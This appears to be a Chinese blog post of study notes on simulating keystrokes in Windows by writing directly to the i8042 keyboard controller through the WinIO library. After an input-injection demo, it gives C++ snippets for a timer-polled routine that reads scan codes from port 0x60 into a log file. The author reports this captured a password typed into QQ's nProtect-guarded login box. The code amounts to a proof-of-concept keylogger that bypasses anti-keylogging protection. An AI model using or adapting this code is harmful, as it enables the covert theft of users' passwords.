
# 如何模拟键盘之学习笔记一

> 原文：`www.pediy.com/kssd/pediy10/59982.html`

因为本人也是个菜鸟，所以就 GOOGLE Baidu 了下来学习

键盘模拟分 3 个层次，第一个层次.局部级模拟，简单说就是 `PostMessage`，这个没啥多说的。了解消息机制就行。

第二个层次，全局键盘消息，简单说就是 `keybd_event` / `SendInput` 函数，也可以用全局钩子，比如，你可以用 `WH_JOURNALPLAYBACK` 这个钩子来模拟按键，据说，`keyboard_event` 填写硬件扫描码对 DriectInput 有效，虚拟健码只对窗口有效，（测试到 DIRECT X 9） 也就是说这样也是可以过 Direct Input 的。。

第三个层次，驱动级别，大家登陆 QQ 的时候都主意到了。密码框旁边有个小小的金锁，这是什么？？这就是大名鼎鼎的 `nProtect`,如果你要模拟 QQ 密码输入，那就是驱动级别的。

那驱动级别如何模拟键盘呢？经查知道，键盘驱动直接读写 `i8042` 芯片，通过 `i8042` 间接的向键盘中的 `i8048` 发命令，所以俺们只要和 `i8042` 打交道就可以了。

`i8042` 有 4 个 8 bits 的寄存器，他们是 `Status Register`（状态寄存器），`Output Buffer`（输出缓冲器），`Input Buffer`（输入缓冲器），`Control Register`（控制寄存器）。使用两个 IO 端口，`60h` 和 `64h`。

好了。菜鸟我喜欢先动手做个程序出来。因为只是个 DEMO。所以没有任何功能。只是 10 秒之后模拟产生 100 个 a...(运行程序的结果就是。10 秒内如果你打开记事本。。等满 10 秒。就会出现 100 个 a)

代码很简单。。先去下载 `WINIO`，然后直接用他的 EXAMPLE `WINIOTEST`

```
if (bResult)
{}内部修改如下。。。

Sleep(10000);

    for(int i=1;i<100;i++)
    {
      Sleep(100);
      MykeyDown(65);
    }
    ShutdownWinIo();
```

//增加 2 个函数

```
void KBCWaitEmpty()
{
   DWORD dwPortVal;
   do
   {
     bool flag = GetPortVal(0x64, &dwPortVal, 1);
   }
   while ((dwPortVal & 0x2) > 0);//   缓冲区满则继续等待，空则退出，
}

void MykeyDown(int vKeyCoad)
{
  int btScancode = 0;
  btScancode = MapVirtualKey((BYTE)vKeyCoad, 0);//虚拟键码转换成扫描码，主要是虚拟键码表比较容易 GOOGLE 到
  KBCWaitEmpty(); // 等待键盘缓冲区为空
    SetPortVal(KBC_KEY_CMD, 0xD2, 1);// 发送命令 总共 12 个命令 D2h 表示准备写数据到 Output Register 中。
                       //随后通过 60h 写入到 Input Register 的字节会被放入到 Output Register 中，此功能被
                       //用来模拟来自于 Keyboard 发送的数据。如果中断被允许，则会触发一个中断。
   // KBCWaitEmpty();
  //  SetPortVal(KBC_KEY_DATA, 0xe2, 1);// 写入按键信息
    KBCWaitEmpty(); // '等待键盘缓冲区为空
    SetPortVal(KBC_KEY_CMD, 0xD2, 1);// '发送键盘写入命令
    KBCWaitEmpty();
    SetPortVal(KBC_KEY_DATA, btScancode, 1);// '写入按下键
}
```

OK .程序编译通过，可以运行了吧？？俺这是 VS 2005    XP SP 2 操作系统下完全成功，然后俺的目标就是 QQ 的那个金锁了！！！。。。。

事实证明，这个金锁形同虚设，简单起见，使用一个记时器记录按键

```
SetTimer(hWnd,IDT_TIMER1,10,(TIMERPROC) NULL);
```

在

```
case WM_TIMER:
        vKeyCoad = ReadkeyDown();
      if(vKeyCoad > 0)
        outfile<<vKeyCoad<<"这就是俺记录下的虚拟键盘"<<endl;;
    break;
```

`ReadKeyDown` 只是简单的读下端口

```
int ReadkeyDown(){
  int vKeyCoad;
  DWORD btScancode = 10000;
    DWORD dwPortVal;
  bool flag;
  flag =   GetPortVal(0x60,&btScancode,1);//
     vKeyCoad = MapVirtualKey(btScancode,1);
     return vKeyCoad;
}
```

结果。。。QQ 密码框输入的密码真的被记录下来了。（QQ 2007 II 版本，就是官网下的版本）晕死。。。`nProtect` 的保护都没看到呢！！

当然，这样记录还有一点小小问题。。因为使用的是记时器，所以，同一按键，就会被多次读取，导致重复，，不过我想，这个问题是可以解决的。暂时就先到这吧。。
